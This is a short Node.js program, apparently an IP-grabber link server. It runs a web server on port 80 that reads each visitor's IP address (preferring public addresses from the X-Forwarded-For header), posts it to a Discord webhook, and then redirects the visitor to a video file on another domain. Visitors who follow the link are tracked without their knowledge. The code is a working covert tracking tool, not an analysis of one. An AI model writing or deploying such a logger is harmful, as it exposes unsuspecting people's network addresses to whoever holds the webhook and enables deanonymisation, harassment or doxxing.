require('dotenv').config();
const http = require('http');
const https = require('https');

const ignoredIps = [
    '216.144.248.29', // Add more IPs here as needed
];

const getClientIp = (req) => {
    const xForwardedFor = req.headers['x-forwarded-for'];
    if (xForwardedFor) {
        const ips = xForwardedFor.split(',').map(ip => ip.trim());
        const uniqueIps = [...new Set(ips)];
        for (const ip of uniqueIps) {
            if (!/^10\.|^172\.(1[6-9]|2[0-9]|3[0-1])\.|^192\.168\./.test(ip)) {
                return ip;
            }
        }
        return uniqueIps[0];
    }
    return req.socket.remoteAddress;
};

const sendToDiscordWebhook = (ip) => {
    if (ignoredIps.includes(ip)) {
        return;
    }

    const data = JSON.stringify({
        content: `IP: ${ip}`
    });

    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
    const url = new URL(webhookUrl);

    const options = {
        hostname: url.hostname,
        path: url.pathname,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    const req = https.request(options, (res) => {
        res.on('data', (d) => {
            process.stdout.write(d);
        });
    });

    req.on('error', (e) => {
        console.error(e);
    });

    req.write(data);
    req.end();
};

const requestListener = (req, res) => {
    const clientIp = getClientIp(req);
    sendToDiscordWebhook(clientIp);

    res.writeHead(302, { 'Location': 'https://b4sicallyf0x.com/up.mp4' });
    res.end();
};

const server = http.createServer(requestListener);
const port = 80;
server.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
